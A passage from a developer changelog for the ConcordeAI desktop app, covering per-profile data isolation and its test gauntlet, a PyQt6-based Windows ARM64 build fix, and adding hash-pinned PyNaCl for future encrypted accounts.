  ssh last named as changed), `_dead_loaded` (the retirements are
  re-read from the new profile's cloud.json), `_chat_stubs`, `_chat_gone`
  and `_chat_finals` (the undo window's copies; the switch first makes the
  old profile's pending deletes final, as a quit does), `_turns_live`
  (answers still streaming), `_usage_q` and `_usage_state`. `_bal_cache`
  is keyed by (provider, key fingerprint) and, like every profile cache,
  scoped to the profile, and `_last_cloud` by
  the profile's name. Every other module-level container that changes is
  named in `MACHINE_STATE` (57: engines, models, installs, the updater,
  the window, flags keyed by folder). The key-fingerprint salt (M6) is
  per launch and holds nothing personal, so it stays the machine's: a
  ticket or a failure from the old profile is refused by the epoch check
  on its write, not by the salt.
- **Background work (5.3).** Every thread carries its starter's ctx. The
  memory pass checks `ctx.cancel` before its model call and before its
  write; the turn writer, titles, exports, pictures, Veo, the cloud-state
  writes, Remote's saves and the usage writer all write through the ctx
  they were started with. `emit` raises `StaleProfile` once its profile's
  ctx is cancelled, so a stream for a profile that stopped being active
  stops, and its answer is saved nowhere. The switch stops read-aloud
  (`_stop_speaking` has waited for the process since 6b326) before the
  epoch moves.
- **X-Profile (4.5).** The page is drawn with `const PROFILE="<tag>"`
  (`__PROFILE__`), `api()` sends it as `X-Profile` on every /api call, and
  `_gate` answers a mismatch with 409 `{"err": "profile-changed"}` and an
  `X-Profile: changed` header (a POST's body drained), changing nothing; a
  route that hits a stale write answers the same. The page reloads on it
  once; a second 409 within 10 s (sessionStorage `millen.p409`, a time,
  nothing personal, and not in the allow-list sweep, which is
  localStorage's) shows "The profile changed. Reload this window to
  continue." instead of reloading again. The page's ETag now includes the
  tag, or a reload after a switch could get a 304 and the old tag, and
  loop. Native callers (the gauntlet, ci_smoke, drill) send no X-Profile
  and act on the profile active when their request starts.
- **Fail closed.** A switch or a new test profile needs the instance
  lock (`single_instance` still fails open for the app itself); a thread
  with no ctx reads no cloud keys, no Remote server and cloud power as
  off; a personal file with no ctx named is an error.
- **Test hooks (5.13), dev copies only.** `profiles`:
  `POST /api/test/profile` with `op` `create` (a local test profile:
  `accounts/<32 hex>/` with a 0600 `account.key` of random test values
  and `test: true`, `sync/state.json` and its media folders), `switch`
  (`to` "local" or a test profile; `erase` drops the old test profile's
  folder), `status` (the tag, stale writes counted, caches not empty),
  `fill` (a canary in every profile cache) and `late` (one of the real
  writers, started under the active profile after `delay` seconds). The
  bare switch (`profile_switch`) is what M9's protocol builds on: it
  stops read-aloud, makes the old profile's deletes final, cancels the
  old ctx, empties every profile cache, moves the epoch and records it,
  under the lock. A dev copy with the hook resumes the test profile
  profile.json names; without the hook a test key file is never opened.
  `delay-<name>=<seconds>` slows the memory write, a picture write, a Veo
  download, an export or a cloud-state write.
- **Lints** (the gauntlet's, each run on the source): every module-level
  container that is mutated is a `profile_cache` or in `MACHINE_STATE`
  (which names only containers that exist, none of them a profile
  cache); every write, replace, delete or folder made outside the profile
  section is in a function `MACHINE_IO` names, no `MACHINE_IO` function
  touches a ctx, and each name in it writes something; every call of the
  30 ctx-taking functions (the chat and memory stores, exports, pictures,
  videos, cloud state, the settings accessors and more) passes its ctx
  and never a constant, and none of them has a default; `current_ctx`
  only where a profile is taken, `load_prefs`/`store_prefs` only in the
  section, no raw thread outside it, and every literal key read through
  an accessor is one of its set's. 1a 9 suggested a `machine_write()`
  helper so the write lint needs no list; the 37 machine writers
  (engines, downloads, installs, the updater, the backdrops, run/ files)
  are named in `MACHINE_IO` instead, each linted to touch no ctx, which
  guards the same thing without rewriting code the gauntlet already
  covers.
- The plan's "Workspace GET that writes" has been a POST since 6b320
  (`/api/workspace/set`, `/off`); both now write through
  `profile_local_update`.
- Deferred to M9 (the plan's order): the `accounts/<dir>` layout with
  `.owner`, the sign-in and sign-out steps, the kept state, the boot
  invariant, the Time Machine exclusion, the browser-store clean-up at a
  switch, `/api/logout`, the account window. The account folder's store
  names are this build's (`chats.v2.json`, `memory.v2.json`) until M9/M13
  settle 1a 5.1's. `lend`/`lend_pick` are named in `PROFILE_LOCAL` for
  1g; nothing sets them yet. ISO-7b's windowed and Windows parts wait for
  real account folders; its no-server half is below.
- Gauntlet: 415 checks become 437 (22 new, three of them from the
  reviews below). Older checks were adapted
  in 43 places: their exec namespaces (a bound ctx, the accessors, the
  profile sections) and source pins that named the old code; no
  assertion was loosened. New, in `== accounts step 8 ==`:
  - the lints on the source, and each shown to bite: 18 planted sites (a
    written module-level cache, the search cache undeclared, a stale or
    doubled MACHINE_STATE name, makedirs, an open-for-write, a replace and
    shutil outside the section, a MACHINE_IO function reading the profile
    or writing nothing, `load_chats(None)`, a store call without its ctx,
    a ctx with a default, background code asking for the active profile,
    a raw thread, `load_prefs` outside the accessors, turbo read as the
    machine's, home_area through the wrong set) each fail the lint that
    guards them;
  - every settings key the page saves (23) is named by a set;
  - the profile module on temporary folders (19 rules: a switch cancels
    the old ctx and empties every cache; a stale write of each kind is
    refused, counted and makes nothing; a stale settings write too; the
    split into personal.json, local.json and the machine's prefs.json;
    unchanged keys unwritten; compare-and-set; an account's view; a
    wrong-set read raises; an erased profile's late write and an active
    profile with no folder make none; "This computer" in one prefs.json
    with the negative prompt beside the Studio's fields; the three sets
    and KEY-2 over every allowed value; a thread's ctx; the hook gate; no
    base refused; boot's `written`), and 18 mutations of the module, each
    caught;
  - ISO-8's search half (the same question after a switch is a miss), the
    balance cache per profile and key, each profile's cloud.json,
    remote.json, host keys and media folders through the thread's ctx,
    and ISO-9 (`_run` clears the thread's search state and binds its ctx,
    unbinding at the end; HTTP/1.0, so no connection outlives a request);
  - live on a copy with the hook, "This computer" as A and a test profile
    as B: ISO-7 both ways (nine real writers, memory, a chat, an export, a
    picture, cloud.json, settings, the answer log, the usage ledger and
    remote.json, started under one profile and landing after the switch:
    all refused, A byte-identical, no canary anywhere, a page drawn for A
    gets 409 with its marker; after B is erased its late writes don't
    bring the folder back); the same nine landing in B while B is active,
    and B's routes showing only B's; the Studio's negative prompt in B's
    local.json and its steps in the machine's prefs.json; ISO-8 with a
    canary in all 23 caches, all empty after the switch, and a picture's
    route answering 404 in the other profile; the page's tag, and `api()`
    in node (the header, one reload, the notice, no loop); the ETag; a
    streamed answer stopped by the switch and saved nowhere.
  - 18 live mutations (the X-Profile check, the 409's marker, emit's
    cancel, the ETag, the hook's gate, a request binding no ctx, the
    page's reload guard, header and 409 handling, a usage record without
    its profile, cloud.json, remote.json and the host-key list from the
    data folder, the balance cache unkeyed, the negative prompt read as
    the machine's, pictures served from the data folder, GET /api/prefs
    from the data folder, an export written straight into the profile)
    each fail at least one check (18 of 18; the four first caught by a
    crash were rerun after the checks were made to record a raise, and
    each now fails its check). Rerun after the reviews' fixes: 17 of 18.
    The one missed, the balance cache keyed without the profile, is
    covered by the epoch scoping, so the profile was taken out of that
    key.
- Not verified here: Windows (`msvcrt.locking` on run/profile.lock, the
  staged renames across `run/` and a profile folder while an antivirus
  holds a file); a real window's reload on 409 (node only); real mflux,
  video and Veo renders landing through `adopt` (stand-ins); an account
  folder with the M9 layout (none exists yet).
- **Three reviews** of the first cut (leaks, locks and races,
  regressions for "This computer"; the third found no change for "This
  computer"), fixed in the same build:
  - **Caches are scoped to the epoch.** A switch emptied every profile
    cache, but nothing stopped a thread of the old profile refilling one
    after it: a delete that took the chat lock after the switch left the
    chat in the undo stubs, and B's own undelete of that id wrote A's
    chat into B's chats.v2.json; the retirements latch, model rests, the
    repair latch, the host ssh named, the search, results and geocode
    caches and the home area's time zone could all be refilled the same
    way. `profile_cache` now returns an `_EpochCache`: it looks like the
    dict, list or set it was declared as, but every access goes to the
    copy of the profile active now, started from the declared value the
    first time after each switch. A thread working for a profile that
    is no longer active (it outlived the switch) gets a scratch copy
    nobody keeps; a thread with no profile (machine work, the usage
    writer) uses the active one. A thread-local stays one (each request
    has a thread of its own and `_run` clears it; documented at
    `profile_cache`). On top: the chat store checks its profile under
    `_chats_lock` before it reads or holds anything (`_chat_live`), an
    undo stub is undeleted or appended to only by its own folder, and
    the retirements and repair latches are never set by a thread with
    no profile (it would read no cloud.json and latch having read
    nothing). The `reset` argument is gone. The cache keeps (epoch,
    object) as one pair, read once, and arms a new epoch only after
    re-reading the active profile under its lock (re-verify: a thread of
    A that read "A is active" just before a switch, resuming after B had
    started using the cache, re-armed it for A's epoch; B could then get
    A's object or lose its own undo stub). `_clear()` resets the epoch
    too.
  - **The switch** takes a switch lock for its whole length and reads
    the old profile under it: two switches at once each cancelled the
    same profile, so one profile was never cancelled and `erase_old`
    could erase the wrong folder. It writes the old profile's queued
    usage records to its ledger first (a record made after that, for the
    old profile, is dropped), then holds read-aloud's lock and the chat
    store's across the epoch move, so no speech or chat write of the old
    profile straddles it. `_speak` checks, under its lock, that the
    thread's profile is still active, so a late /api/speak doesn't read
    A's answer aloud in B's session.
  - **Nothing stale falls back or retries.** A local picture finished
    after a switch raised StaleProfile, which `generate_image`'s generic
    handler took for a local failure: the old profile's saved Gemini key
    was then used for two paid calls. `generate_image`,
    `generate_video`, the Veo download, `_ssh_once`, `_cloud_save_state`,
    `_cloud_save_failed`, `_remote_save` and the routes that save a key,
    clear a key or a Remote server, forget a host or make an export now
    let StaleProfile through (a 409, or the end of a stream) instead of
    "the folder is read-only" or a fallback. The Veo poll stops once its
    profile is cancelled. A cancelled stream's `finally` sends no "Answer
    written", no badge and no place pins (which could call the old
    profile's key), and makes no export, log line or memory pass. A
    lint holds it: a `try` around a profile write whose broad handler
    comes before any `except StaleProfile` fails, unless its function
    only drops the write (a named list: the cloud rest and failure
    writers, the store's catch-ups, the memory pass, and the like).
  - **`ctx.adopt` never deletes a finished file it couldn't move.** On
    Windows a reader (an antivirus) can hold a finished clip past
    `_replace_into`'s retries; it used to be deleted. Now a copy is
    tried, then the original goes; if that fails too, the file stays in
    run/ and `NotLanded` says where, relative to the data folder (no
    user name in the chat): "couldn't save it into ConcordeAI's folder
    (...); it is kept at run/stage-... until the app next starts" (the
    next start's sweep of `stage-*` clears it). Only StaleProfile
    deletes it. `run_export` keeps its stage file in that case (its
    `finally` used to delete what the message said was kept), and a
    picture or clip that finished but couldn't be saved is never made
    again elsewhere: `NotLanded` passes the local branch's handler, so
    no Gemini call follows.
  - `split_prefs` writes the profile's keys first and the machine's last,
    after one more epoch check, so a 409 means nothing changed.
  - `current_ctx()` reads `_PROFILE["ctx"]` without the lock (one atomic
    read): a request's start waited behind any personal write, 1.96 s
    measured behind a slow Windows replace.
  - One failed flock no longer turns `run/profile.lock` off for the
    whole run; only a `run/` that can't be made does. The next write
    tries the flock again.
  - `_pfile` refuses `MACHINE_ROOT` for a profile's own files
    (`PERSONAL_NAMES`: the chat, memory, settings, cloud, Remote and
    usage files, the logs and the media folders): the machine's root
    skips the epoch check, so no personal write may go through it.
  - **The lints, widened.** Writes: pathlib; a writing function of os,
    shutil, tempfile, io, codecs, zipfile, tarfile, sqlite3 imported bare
    or taken as a value; `os.open` with any flags but `O_RDONLY`; zip,
    tar, gzip and codecs opened to write; `shutil.make_archive`, sqlite3,
    and a library's `.save()`. Threads: `from threading import`, a Thread
    subclass, ThreadPoolExecutor and ProcessPoolExecutor outside the
    profile section. Containers: a class attribute or a mutable default
    that is mutated, an annotated module-level container, a
    SimpleNamespace or a queue, and a module container written through a
    local alias. ctx arguments: `MACHINE_ROOT` as a store's ctx, a
    ctx-taking function taken as a value (a thread's target and a
    timer's function may be named; their args must carry the ctx).
    Callers: `current_ctx` taken as a value, `_PROFILE` read outside the
    section, a `MACHINE_IO` function handed a profile's path. 25 more
    planted sites, each caught (43 in all). Not covered, and said so: a
    file written by a child process (`subprocess.run(["cp", ...])`) and a
    cache kept in a closure.
  - New machine writers named: `_run_render` (its log's temporary file),
    `ex_doc`, `ex_slides` and `ex_archive` (they write through a library
    into a stage file). `_boot_heal`'s mutable default counter became
    `_BOOT_HEALS` (machine state).
  - Gauntlet: two more in-process checks: cases from the reviews (a
    late delete from A's thread and from a thread with no profile, a
    foreign undo stub, a cache refilled by A's thread, the latch,
    read-aloud, two switches at once, current_ctx behind a write, one
    flock failure, `MACHINE_ROOT` refused, adopt's copy and keep, the
    settings order, a stale picture with no paid fallback, the Veo poll,
    stale key and Remote saves, the usage queue at a switch, a pool's
    workers, and from the re-verify the cache race, an export kept where
    its message says, a picture that couldn't be saved made nowhere
    else), 20 cases in all, and 22 mutations of the fixes, each caught
    (the single read of the pair and the re-check each close the race
    alone, so the mutation reverts both); live, a late
    writer into every cache after the switch, and no "Answer written"
    or place pins after it on the stopped stream.
- **For M9** (from the reviews): a switch should flush the live turns
  first, as a quit does, so A's partial answer isn't dropped; and
  `/api/prefs/adopt` could copy A's leftover browser keys into B's
  local.json when a page drawn for A posts them after a switch (the page
  reloads on the 409 first today, but the sign-in flow should clear the
  browser store before B's page boots).
- **Patrick:** nothing. "This computer" works as before.

## 6b328 — the ARM64 build opens its window with Qt
Proven in Patrick's Windows 11 ARM64 VM: the installed native ARM64 build
(`build_windows_exe.ps1 -Arch arm64`) said "ConcordeAI couldn't start.
RuntimeError: Failed to create a .NET runtime (coreclr)". crash.log:
`webview.start` → `guilib.initialize` → `import_winforms` → `import clr`
→ clr_loader loading `_internal\clr_loader\ffi\dlls\amd64\ClrLoader.dll`
(0xc1, the wrong architecture). Not a regression: the frozen ARM64 build
had never run before.
- **Why.** `_web_engine()` says "qt" there, but `webview.start` was never
  told. pywebview 6.2.1's `guilib.initialize` on Windows tries only
  WinForms unless `gui` (or `PYWEBVIEW_GUI`) is "qt"; with it, Qt first
  and WinForms as the fallback. And pywebview requires pythonnet on every
  Windows, so pip put it (and clr_loader, which ships x86 and amd64 DLLs
  only) in the ARM64 build venv, and `--collect-all webview` froze it in
  through the WinForms backend.
- **The app:** `_webview_gui()` is `{"gui": "qt"}` when `_web_engine()`
  is "qt" and `{}` otherwise; the one `webview.start` call spreads it.
  macOS and x64 (and x64 emulated on an ARM PC) call it as before.
- **The .NET three stay out.** Checked first against pywebview 6.2.1's
  source (the PyPI wheel): outside the WinForms, EdgeChromium, MSHTML,
  win32 and CEF backends nothing imports clr, pythonnet, clr_loader or
  System, and the only reference to a .NET backend is guilib's
  `import_winforms`; `platforms/qt.py` imports qtpy and pywebview's own
  common modules. So the ARM64 freeze has `--exclude-module` clr,
  pythonnet and clr_loader, and the build throws if `_internal\clr_loader`
  or `_internal\pythonnet` is in the finished folder. The build venv is
  reused, so pythonnet stays installed in it; the exclusions keep it out.
- **The Qt is PyQt6, not PySide6.** The PySide6-Addons win_arm64 wheels
  (6.9.3, 6.10.2, 6.11.2, read from PyPI) carry no QtWebEngineWidgets,
  Qt6WebEngineCore or QtWebEngineProcess (the win_amd64 ones do), so the
  old ARM64 build could never have drawn its window. PyQt6-WebEngine and
  PyQt6-WebEngine-Qt6 publish win_arm64 wheels with all three.
  **PyQt6 is GPL-3.0; Patrick accepted this on 2026-09-28 and the source
  is public.** (Licensing files are being handled separately.)
  - `packaging/qt-arm64-requirements.txt` pins, with every win_arm64
    wheel's sha256 from PyPI's JSON API (checked with a hash-verified
    `pip download` for win_arm64 cp313, and a dry-run resolve for cp311,
    cp313 and cp314): PyQt6 6.11.0 and PyQt6-WebEngine 6.11.0 (the
    newest; cp310-abi3), PyQt6-Qt6 and PyQt6-WebEngine-Qt6 6.11.2 (the
    newest, and one Qt for both; py3-none), PyQt6-sip 13.12.0 (cp311 to
    cp314: it has no cp310 win_arm64 wheel, and the ps1 already asks
    for 3.11 or newer on ARM64), QtPy 2.4.3. pywebview names QtPy only
    on OpenBSD or with an extra, so the ARM64 build never had it; QtPy's
    one dependency, packaging, comes with PyInstaller. The ps1 installs
    the file `--only-binary=:all: --require-hashes --no-deps
    --force-reinstall` after the other deps, ARM64 only.
  - `QT_API=pyqt6`: the ps1 sets it before the build venv's import check
    and PyInstaller (PyInstaller's qtpy hook reads it and leaves the
    other bindings out), and millenai.py sets it at import on the native
    ARM64 build only, overriding an inherited value, before anything
    imports qtpy. The frozen exe holds only PyQt6 anyway.
  - The build venv must import `webview.platforms.qt` with WebEngine and
    qtpy on PyQt6 before PyInstaller runs.
  - PyInstaller: PyInstaller's own hooks (not hooks-contrib's) cover
    PyQt6's WebEngine: hook-PyQt6.QtWebEngineCore collects
    QtWebEngineProcess.exe, `resources` and `qtwebengine_locales`
    (PyInstaller 6.22.3's source). The ARM64 freeze hidden-imports
    `webview.platforms.qt` and PyQt6's QtWebEngineWidgets,
    QtWebEngineCore, QtWebChannel and QtNetwork; it excludes PySide6,
    shiboken6, PySide2 and PyQt5 (a freeze may hold one binding, and
    an older build venv still has PySide6); `--collect-all PySide6` is
    gone. After the build it throws unless
    `_internal\PyQt6\Qt6\bin\QtWebEngineProcess.exe` and
    `_internal\PyQt6\Qt6\resources\qtwebengine_resources.pak` are
    there, and if `_internal\PySide6` is.
  - x64 is unchanged: faster-whisper, `--hidden-import` edgechromium and
    clr, no exclusions.
- **The app on PyQt6.** `_webstore_qt_cache` is the only Qt code:
  `from qtpy import QtCore`, `QtCore.QObject`, `Signal`, `Slot`,
  `QCoreApplication.instance().thread()` and the profile's
  `clearHttpCache` all exist through qtpy on PyQt6; its queued
  connection now names `Qt.ConnectionType.QueuedConnection` (PyQt6 has
  only scoped enums; the unscoped name worked only through qtpy's
  promotion). `_QT_CLEAR_CACHE` is a plain flag. Run for real on this
  Mac with the pinned PyQt6 6.11 (macOS wheels, a scratch venv): the
  function, from a worker thread, cleared a QWebEngineProfile's cache
  on the main thread; and pywebview 6.2.1 with `gui="qt"` opened a
  window (offscreen), loaded, ran JS, answered a `js_api` call, kept its
  profile in `storage_path`, used `webview.platforms.qt` on PyQt6 and
  loaded no clr.
- In the app, the Qt path imports clr nowhere: `_webstore_wv2` and
  `_webstore_wv2_value` run only when the engine is "webview2", and
  nothing calls `webview.screens` (which would initialize pywebview
  unasked) before the window.
- Gauntlet: 410 checks become 415. The one `webview.start` call,
  evaluated with a recording webview on a Mac, x64, x64 emulated on ARM,
  native ARM64 and neither, gets `gui="qt"` on native ARM64 only; the
  installed pywebview (6.2.1), made to think it is on Windows with its
  Qt backend stubbed and clr, pythonnet, clr_loader and the .NET
  backends blocked, loads Qt when asked and asks for none of them, and
  unasked asks for WinForms and raises; an AST scan of the installed
  package finds only guilib naming WinForms; the QT_API line, run with
  an inherited `QT_API=pyside6` on each kind of machine, sets pyqt6 on
  native ARM64 only, and the queued connection is scoped; the ps1's
  ARM64 freeze excludes the seven (x64 none, x64's lines as they were),
  the hash-checked install, QT_API, then the PyQt6 import check between
  pip and PyInstaller, and the folder checks between PyInstaller and the
  self-test; the requirements file's six pins, every hash distinct, four
  for sip, one Qt version. 36 mutations each fail a check: no gui
  argument, gui="qt" hard-coded, the helper always, never, on every
  Windows or "cef", emulated x64 counted as Qt, a second
  `webview.start`; QT_API gone, pyside6, on every Windows, or
  setdefault; the unscoped enum; no exclusions, PySide6 not excluded,
  only clr of the .NET three, the exclusions on x64, PySide6 back in
  the deps, faster-whisper gone from x64, no pinned install or no
  `--require-hashes`, no QT_API or QT_API after the import check, the
  import check without its binding test or gone, no leftover or
  WebEngine-helper check, WebEngineWidgets not hidden-imported, a
  non-ASCII dash; a hash dropped, WebEngine-Qt6 on another Qt, PyQt6
  unpinned, a sip hash gone, QtPy missing; pywebview's initialize
  ignoring gui, and a copy of 6.2.1 whose qt.py imports clr.
- Verified on Patrick's Windows 11 ARM64 VM (2026-09-29): `-Arch arm64`
  under Python 3.13.15 ARM64 built ConcordeAI-6.1.0-Setup-arm64.exe
  (134 MB). It installed per user, the crypto self-test said win-arm64,
  and the app opened its window (QtWebEngineProcess running, no
  crash.log entry). The first native ARM64 window this app has shown.
- Before an ARM64 installer is handed to anyone: PyQt6 is GPL-3.0, so the
  repo needs a GPL-3.0 LICENSE (Patrick's call, pending).

## 6b327 — PyNaCl on every build (accounts step 7)
The install half of 0a 5.9 and 1c 5.1: M7 of the sign-in plan, with the
fixes from its two reviews and a re-verify. Patrick approved the
dependency and the one-time PyPI fetch on 2026-09-28. Accounts will
encrypt on this computer with libsodium through PyNaCl; this step puts
PyNaCl on every build and every existing setup, proves it works, and
keeps accounts off wherever it doesn't. No account screen or account
call exists yet, and signed updates (the other half of 5.9) wait for the
offline release key.
- **One list, `CRYPTO_REQS`,** in millenai.py: a pip requirements text
  with every wheel's sha256, as PyPI's JSON API listed it, each checked
  against the downloaded file (39 wheels, 0 mismatches):
  - pynacl 1.6.2, the four cp38-abi3 wheels: macOS universal2, Windows
    x64, ARM64 and 32-bit. One wheel covers every CPython from 3.8 on.
  - cffi 2.0.0 for Python 3.9 (the Command Line Tools' Python the Mac
    launcher can fall back to): macOS x86_64 and arm64, Windows x64 and
    32-bit.
  - cffi 2.1.1 for 3.10 to 3.15 (it already has cp315 wheels, so the
    plan's 3.15 risk is covered for crypto): macOS x86_64 and arm64,
    Windows x64 and 32-bit, Windows ARM64 from 3.11.
  - pycparser 2.23 (3.9) and 3.0 (3.10 on), by marker.
  - No wheel, so no crypto: Windows ARM64 on Python 3.9 or 3.10,
    free-threaded builds (3.14t), Linux, Python 3.8 and older. pip
    resolved every other macOS arm64/x86_64 and Windows x64/ARM64 pair
    from 3.9 to 3.15 against the pins (`pip download --platform`, 3.9
    with the system Python 3.9).
  `crypto_reqs(only=...)` renders it; `packaging/crypto_reqs.py` reads
  the literal out of millenai.py with `ast` (never imports it) and
  writes `crypto-requirements.txt` for the build scripts. It exits 3 on
  a millenai.py without the list (an old tag in the Windows workflow).
- **What `--require-hashes` covers:** every wheel pip downloads is
  hash-checked. A package already installed that satisfies a pin is
  not downloaded, so it is not checked again. The build venvs live
  between builds, so their pip lines add `--force-reinstall`; a first
  run's new venv, and the app's own install (which runs only when nacl
  won't import or fails the known answers), download what they install.
- **`cai_crypto`**, a delimited section near the top of millenai.py
  (`# ==== cai_crypto: begin/end ====`), stdlib plus a lazy nacl
  import, no network code, no logging; the gauntlet execs it alone. M10
  fills in the primitives. `available()` runs a known-answer test once
  and remembers it until `reset()`: Ed25519 (RFC 8032 7.1 TEST 1: key,
  signature, verify, a flipped bit refused), X25519 (RFC 7748 5.2),
  XChaCha20-Poly1305-IETF (draft-irtf-cfrg-xchacha-03 A.3.1: seal, open,
  a flipped tag refused) and Argon2id with 3 passes over 8 KiB (from
  review: 3 passes reach code a 1-pass run never does; the answer was
  checked independently, by libsodium and by a pure-Python Argon2
  written from RFC 9106). Importing nacl isn't enough: a frozen build
  without `_cffi_backend`, or a libsodium that answers wrong, never
  counts as ready. `status()` is (ok, state, why): ready, missing or
  error.
- **`_ensure_crypto_deps()`**, beside `_ensure_tzdata`, on a thread
  started only by the copy holding the instance lock (`single_instance`
  can let a copy run without it; two copies must never pip into one
  venv): ready, or one install of the pins, or a reason. Its own pip
  call, `python -m pip install --timeout 15 --retries 1
  --only-binary=:all: --require-hashes --no-deps -r <temp file>`, then
  a fresh known-answer test. It installs only into a venv inside this
  copy's own data folder (`_inside(sys.prefix, app_dir())`): the app's
  venv qualifies, a frozen build, a system or Homebrew Python and any
  other venv don't. That rule is the dev-copy guard: a dev or test copy
  runs on the real app's venv, which its MILLENAI_HOME can never hold,
  so it never installs into it (it says "the venv isn't this copy's
  own"). Where cffi is already loaded, or on Windows installed at all
  (pythonnet loads it when the window opens and a loaded .pyd can't be
  replaced), only pynacl's pin goes: the Windows zip case.
- **One fetch, not one per launch (review).** Each attempt is written to
  `crypto-install.json` in the data folder: `{key: "<APP_BUILD> <Python
  version>", ok, at, note}`. The record is read only while PyNaCl
  doesn't load, so a recorded success counts like a failure (re-verify).
  A new build or Python runs at once; otherwise 3 days after the
  attempt, and until then /api/stats says what failed and the date it
  tries again. An `at` that isn't a finite number between 0 and now (a
  clock set back, a hand-edited file) counts as expired. Offline reads
  as offline: a connection error is "couldn't reach PyPI", and pip's
  "(from versions: none)" is "couldn't reach PyPI (or it has no wheel
  for this Python)", not a packaging fault.
- **`/api/stats` carries `crypto`:** `{ok, state, note}`, state ready,
  installing, missing or error.
- **Accounts stay off without it (CRY-4).** `ACCOUNTS` (the plan's build
  flag) is on in dev copies only, until M17; the REM-1 check pins it
  (off with no dev folder, on with one). `accounts_gate()` answers (ok,
  why); every account action must ask it before any socket opens to the
  sync server. `/api/me` gains `accounts: {on, note}`.
  - **A dev copy never uses the real sync server (review).** SYNC_URL
    falls back to production, so the gate refuses in a dev copy whose
    SYNC_URL names the production host: accounts in a dev copy need
    MILLENAI_SYNC_URL. The check is by host name
    (`urlsplit(...).hostname`, a trailing dot dropped; re-verify), so a
    trailing slash, capitals, :443, http:// or a user@ can't pass for
    another server, and a URL that won't parse refuses too. Chosen over
    "ACCOUNTS only when MILLENAI_SYNC_URL is set" because it keeps
    ACCOUNTS the plain build flag the plan names, and the refusal says
    why instead of the screens silently missing.
  - **`_sync_url()`** returns SYNC_URL only when the gate allows, else
    None. The gauntlet lints that only `accounts_gate` and `_sync_url`
    read SYNC_URL, each a top-level function defined once (a nested def,
    a method or a lambda of that name gets no pass); that SYNC_URL and
    SYNC_PROD are each assigned once; that SYNC_PROD is read only in
    SYNC_URL's assignment and in `accounts_gate`; and that the host's
    name appears only in `SYNC_PROD`'s value. It walks every function
    and class body.
  - **The pane is passive (review):** it sent nothing, so it doesn't
    say so. Settings › Account shows "Encryption isn't set up, so
    accounts are off.", "Setting up encryption." while an install runs,
    and in a dev copy without a test server "This dev copy has no test
    sync server (MILLENAI_SYNC_URL), so accounts are off." An account
    action refused keeps the spec's sentence (1c 5.16): "Couldn't set up
    encryption. Accounts need it, and nothing was sent." The 2 s stats
    poll repaints the pane when the crypto state moves, so it clears
    when an install finishes. The app a person opens has no accounts
    yet, so it shows nothing.
  - **CRY-4's socket and pip half is a placeholder** until the first
    account call exists (M10 on): today nothing contacts the sync host
    in any state, so "no socket opens" can't yet fail for the reason it
    guards. The lint and the gate are what hold until then.
- **Test hooks, dev copies only:** `no-nacl` (nacl counts as missing,
  CRY-4) and `crypto-wheels=<dir>` (the install reads the pinned wheels
  from a local folder, `--no-index`).
- **The builds:**
  - build_macos_app.sh: the build venv gets the hashed pins with
    `--force-reinstall` (not fatal; the app fetches them at its next
    start), the bundle carries crypto-requirements.txt, and the
    first-run launcher installs it after pywebview.
  - build_windows.sh: `deps-3` becomes `deps-4 … pynacl-1.6.2`, so every
    existing zip setup runs pip once more; the .bat installs the hashed
    pins from `%~dp0crypto-requirements.txt` before pywebview (so the
    pinned cffi is the one pywebview finds), not fatal. The zip carries
    the file.
  - build_windows_exe.ps1: the hashed pins in their own pip call before
    `$deps`, with `--force-reinstall` (fatal: an installer without
    crypto would leave accounts off for everyone), `--hidden-import
    _cffi_backend --collect-submodules nacl` for x64 and ARM64 alike,
    then **the exe's own self-test**: `MillenAI.exe --crypto-selftest
    <file>` runs before anything else (no window, port or data folder),
    writes cai_crypto's result as JSON and exits 0 only when it passed;
    the build throws otherwise. The JSON carries `platform`
    (`sysconfig.get_platform()`, what the exe was built for; `machine` is
    the OS's), and the build throws unless it is win-arm64 for an ARM64
    build and win-amd64 for x64.
  - build_windows_exe.ps1 also: **`-Arch x64|arm64`** takes only an
    interpreter of that architecture and stops with the list it found
    when there is none. The parameter is `$Want`, with `-Arch` as its
    alias (re-verify, the blocker): PowerShell's variable names ignore
    case, so a parameter named `$Arch` was the script's own `$arch`,
    which it sets to the interpreter's machine; `AMD64` is outside the
    ValidateSet, so every x64 build (CI's included) threw, and Find-Python
    compared against the last candidate's machine. No variable may share
    the parameter's name in any case, and `$Want` is never assigned
    (an assignment is validated too); with no `-Arch` it prefers x64
    as before. It prints the interpreter and architecture it chose.
    **An interpreter's architecture is its build platform** (re-verify,
    found in the ARM64 VM): `platform.machine()` reports the OS's machine,
    so on Windows on ARM an x64 Python under emulation says ARM64 as well.
    The build took the x64 Python for `-Arch arm64` and made
    "ConcordeAI-6.1.0-Setup-arm64.exe" holding an x64 app, and "prefer
    x64" had never worked on an ARM box. Get-PyArch, the chosen
    interpreter and the build venv's identity now read
    `sysconfig.get_platform()`: win-amd64 is x64, win-arm64 is arm64,
    win32 is x86 (refused). The "interpreters found" list shows that.
    `.build-venv` is made again when a different interpreter (platform
    and version) made it, so switching `-Arch` can't freeze the old
    one in. ISCC is also looked for in `%LOCALAPPDATA%\Programs\Inno
    Setup 6` (a per-user install). The file's one non-ASCII character
    (an em-dash in a comment, which its own header warns about) is now
    ASCII.
  - windows-installer.yml runs the same self-test as its own step after
    the build, before WiX, and requires `platform` win-amd64.
    nightly.yml installs the pins into the CI Python before the boot
    check, and ci_smoke.sh now asserts `crypto` ready on /api/stats (a
    Python without PyNaCl fails it; the script says how to install the
    pins).
- **The same mistake elsewhere (checked, re-verify):** the .bat and the
  zip pick no architecture. In millenai.py, `IS_WIN_ARM`
  (`_win_native_machine`: the registry, then `platform.machine()`) wants
  the machine's architecture, to fetch the native ARM64 Ollama under an
  emulated app, so `platform.machine()` is right there; `IS_WIN_EMULATED`
  already reads `sysconfig.get_platform()`, and so do the update offer's
  "native ARM64 install" and the web engine's Qt choice, through it.
  The comment above `_win_native_machine` said `platform.machine()`
  reports the process's architecture; it now says what the VM measured.
  `IS_ARM` is macOS only (under Rosetta `platform.machine()` says x86_64,
  the process's, which is what MLX needs). No behaviour changed there.
- **The gauntlet** installs the pins, hash-checked, into a folder of the
  run's own and puts it on PYTHONPATH when its Python has no nacl
  (`SMOKE_CRYPTO_WHEELS=<dir>` keeps that off PyPI). It never installs
  into the app's venv.
- Gauntlet: 384 checks become 410 (26 new; 6b316's launcher check now
  expects deps-4, REM-1's pins ACCOUNTS, and 6b318's Settings check
  slices to openAbout's own paintAccount call, since the stats poll now
  makes one earlier in the page). In-process: the pins
  (versions, markers, 39 distinct hashes, pynacl alone for the zip),
  the build helper's output equal to the list, cai_crypto exec'd alone
